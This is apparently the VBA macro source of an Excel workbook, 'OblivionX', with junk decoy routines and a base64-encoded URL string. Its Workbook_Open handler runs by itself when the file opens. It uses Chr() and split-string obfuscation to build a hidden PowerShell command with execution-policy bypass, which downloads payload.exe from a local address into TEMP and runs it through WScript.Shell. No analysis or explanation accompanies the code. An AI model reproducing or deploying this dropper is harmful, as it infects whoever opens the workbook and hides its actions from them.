
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim jybosg1pnivrj As String
    Dim lps4wdhm As Object
    Dim sbospdtkrqzns As String, outPath As String
    sbospdtkrqzns = "http" & Chr(58) & Chr(47) & Chr(47) & Chr(49) & Chr(50) & Chr(55) & ".0.0.1:9" & "090/" & "payl" & "oad.exe"
    outPath = Environ("TEMP") & "\obl" & "ivionx_" & "payl" & "oad.e" & "xe"
    jybosg1pnivrj = "powers" & "hell.ex" & "e -N" & "oProfile " & "-WindowS" & "tyle Hidd" & "en " & _
          "-Execut" & "ionP" & "olicy" & " Byp" & "ass " & "-Command" & " " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & sbospdtkrqzns & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set lps4wdhm = CreateObject("WScript.S" & "hell")
    lps4wdhm.Run jybosg1pnivrj, 0, False
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
